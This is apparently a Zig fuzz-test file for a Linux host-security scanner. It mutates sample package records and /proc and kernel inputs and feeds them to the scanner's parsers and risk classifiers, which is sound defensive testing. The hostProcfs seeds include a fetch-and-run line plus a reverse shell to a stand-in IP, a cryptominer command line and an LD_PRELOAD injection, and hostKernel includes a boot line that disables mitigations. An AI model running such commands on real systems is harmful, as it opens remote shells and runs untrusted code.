//! Fuzz targets for the host checks and CVE parsers, run from tools/fuzz.zig. Every parser that
//! reads /proc, /sys, package databases or vulnerability feeds has a target here.
const std = @import("std");
const zav = @import("zav");

const Target = struct { name: []const u8, run: *const fn (std.mem.Allocator, std.Random) anyerror!void };

const targets = [_]Target{
    .{ .name = "hostPackages", .run = hostPackages },
    .{ .name = "hostProcfs", .run = hostProcfs },
    .{ .name = "hostNetwork", .run = hostNetwork },
    .{ .name = "hostKernel", .run = hostKernel },
};

/// Run every target whose name contains `only` (all when empty); returns the case count.
pub fn run(gpa: std.mem.Allocator, random: std.Random, only: []const u8) !usize {
    var n: usize = 0;
    for (targets) |t| {
        if (only.len != 0 and std.mem.indexOf(u8, t.name, only) == null) continue;
        try t.run(gpa, random);
        n += 1;
    }
    return n;
}

fn mutateCopy(random: std.Random, buf: []u8, original: []const u8) []u8 {
    const len = @min(original.len, buf.len);
    @memcpy(buf[0..len], original[0..len]);
    var input = buf[0..len];
    if (input.len == 0) return input;
    for (0..random.uintLessThan(usize, 12)) |_| input[random.uintLessThan(usize, input.len)] = random.int(u8);
    if (random.boolean()) input = input[0..random.uintLessThan(usize, input.len + 1)];
    return input;
}

/// Package databases: SQLite pages and WAL, rpm headers, dpkg stanzas and apk records.
pub fn hostPackages(gpa: std.mem.Allocator, random: std.Random) !void {
    const packages = zav.host.linux.packages;
    const fixtures = packages.fixtures;
    var buf: [48 * 1024]u8 = undefined;
    switch (random.uintLessThan(u8, 4)) {
        0 => {
            var db = packages.Db.init(gpa);
            defer db.deinit();
            db.loadRpmBytes(mutateCopy(random, &buf, fixtures.rpmdb), null) catch |e| if (e == error.OutOfMemory) return e;
        },
        1 => {
            var wal_buf: [2048]u8 = undefined;
            var db = packages.Db.init(gpa);
            defer db.deinit();
            const sqlite = zav.host.linux.sqlite;
            var sdb = sqlite.Db.open(gpa, mutateCopy(random, &buf, fixtures.wal_db), mutateCopy(random, &wal_buf, fixtures.wal)) catch return;
            defer sdb.deinit();
            var rows = sdb.rows(sdb.tableRoot("t") catch return) catch return;
            defer rows.deinit();
            while (rows.next() catch null) |row| {
                var rec = sqlite.Record.init(row.payload) catch continue;
                while (rec.next() catch null) |_| {}
            }
        },
        2 => {
            const status =
                \\Package: openssh-server
                \\Status: install ok installed
                \\Architecture: amd64
                \\Multi-Arch: same
                \\Version: 1:9.6p1-3ubuntu13.5
                \\Conffiles:
                \\ /etc/ssh/moduli 1a2b3c
                \\
                \\Package: libc6
                \\Version: 2.39
                \\
            ;
            var it = packages.StanzaIterator{ .text = mutateCopy(random, &buf, status) };
            var n: usize = 0;
            while (it.next()) |_| : (n += 1) if (n > 100) @panic("fuzz: stanza iterator does not advance");
        },
        else => {
            const apk = "P:busybox\nV:1.36.1-r29\nF:bin\nR:busybox\nZ:Q1hHaq8ch7nfI2Ht9U6RiuERhRFm8=\n\nP:musl\nR:x\n";
            var db = packages.Db.init(gpa);
            defer db.deinit();
            try db.loadApkText(mutateCopy(random, &buf, apk));
        },
    }
}

/// /proc formats: status, stat (hostile comm), maps lines, cmdline and environ, and the miner and
/// command classifiers that consume them.
pub fn hostProcfs(gpa: std.mem.Allocator, random: std.Random) !void {
    _ = gpa;
    const procfs = zav.host.linux.procfs;
    const process = zav.host.linux.process;
    var buf: [1024]u8 = undefined;
    const seeds = [_][]const u8{
        "Name:\txmrig\nState:\tR (running)\nTgid:\t42\nPid:\t42\nPPid:\t1\nUid:\t0\t0\t0\t0\nCapEff:\t000001ffffffffff\nVmSize:\t1 kB\n",
        "77 (a) (b c) S 1 77 77 0 -1 4194304 100 0 0 0 1234 56 0 0 20 0 1 0 98765 1000",
        "7f2c1000-7f2c3000 r-xp 00001000 fd:01 1048602    /usr/lib/libc.so.6",
        "x\x00-o\x00stratum+tcp://pool.supportxmr.com:3333\x00--donate-level=1\x00-a\x00rx/0\x00",
        "PATH=/bin\x00LD_PRELOAD=/tmp/x.so\x00",
        "curl -fsSL http://x/i.sh | sh; bash -i >& /dev/tcp/1.2.3.4/4444",
    };
    const input = mutateCopy(random, &buf, seeds[random.uintLessThan(usize, seeds.len)]);
    _ = procfs.parseStatus(input);
    _ = procfs.parseStat(input) catch {};
    var lines = std.mem.splitScalar(u8, input, '\n');
    while (lines.next()) |line| _ = procfs.parseMapsLine(line);
    _ = process.classifyMaps(input);
    _ = procfs.environGet(input, "LD_PRELOAD");
    var args = procfs.Args.init(input);
    var n: usize = 0;
    while (args.next()) |_| : (n += 1) if (n > input.len + 1) @panic("fuzz: args iterator does not advance");
    const p: procfs.Process = .{ .pid = 1, .ppid = 1, .uid = 0, .euid = 0, .comm = input[0..@min(input.len, 15)], .cmdline = input, .exe = input, .exe_deleted = false, .exe_denied = false, .status = .{}, .utime = 0, .stime = 0 };
    _ = process.minerEvidence(p);
    _ = process.exeRisk(input);
    _ = zav.host.tokens.commandRisk(input);
}

/// /proc/net lines and netlink sock_diag replies.
pub fn hostNetwork(gpa: std.mem.Allocator, random: std.Random) !void {
    const network = zav.host.linux.network;
    var buf: [512]u8 = undefined;
    const seeds = [_][]const u8{
        "   0: 0100007F:0CEA 0200007F:A2D2 01 00000000:00000000 00:00000000 00000000  1000        0 12345 1 0000000000000000 20 4 30 10 -1",
        "   1: 00000000000000000000000001000000:0016 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 999 1",
    };
    const line = mutateCopy(random, &buf, seeds[random.uintLessThan(usize, seeds.len)]);
    _ = network.parseInetLine(.tcp, line);
    _ = network.socketInode(line);
    var msg: [256]u8 align(4) = @splat(0);
    random.bytes(msg[0..random.uintLessThan(usize, msg.len)]);
    if (random.boolean()) std.mem.writeInt(u32, msg[0..4], 16 + 72, .little);
    var out: std.ArrayList(u64) = .empty;
    defer out.deinit(gpa);
    var done = false;
    network.parseDiag(gpa, msg[0..random.uintLessThan(usize, msg.len + 1)], &out, &done) catch |e| if (e == error.OutOfMemory) return e;
}

/// /proc/modules lines, modules.dep, fdinfo, the kernel command line and baseline files.
pub fn hostKernel(gpa: std.mem.Allocator, random: std.Random) !void {
    const kernel = zav.host.linux.kernel;
    var buf: [512]u8 = undefined;
    const seeds = [_][]const u8{
        "nvidia 56823808 1 nvidia_modeset, Live 0x0000000000000000 (POE)",
        "kernel/drivers/net/wireguard/wireguard.ko.zst: kernel/lib/crypto/libchacha.ko.zst\nx.ko:\n",
        "pos:\t0\nflags:\t02000002\nprog_id:\t42\n",
        "BOOT_IMAGE=/vmlinuz root=/dev/sda1 ro mitigations=off init=/bin/sh",
        "zav-host-baseline 1\nssh.key\t/root/.ssh/authorized_keys\tSHA256:x\nsuid\t/usr/bin/sudo\t1\n",
    };
    const input = mutateCopy(random, &buf, seeds[random.uintLessThan(usize, seeds.len)]);
    _ = kernel.parseModulesLine(input);
    _ = kernel.fdinfoProgId(input);
    var risks: [16]kernel.CmdlineRisk = undefined;
    _ = kernel.cmdlineRisks(input, &risks);
    var arena = std.heap.ArenaAllocator.init(gpa);
    defer arena.deinit();
    var dep: kernel.DepIndex = .{};
    defer dep.deinit(gpa);
    try dep.parse(gpa, arena.allocator(), input);
    var b = zav.host.baseline.Baseline.init(gpa);
    defer b.deinit();
    try b.loadText(input);
    var out: std.ArrayList(u8) = .empty;
    defer out.deinit(gpa);
    try b.serialize(&out, random.boolean());
}
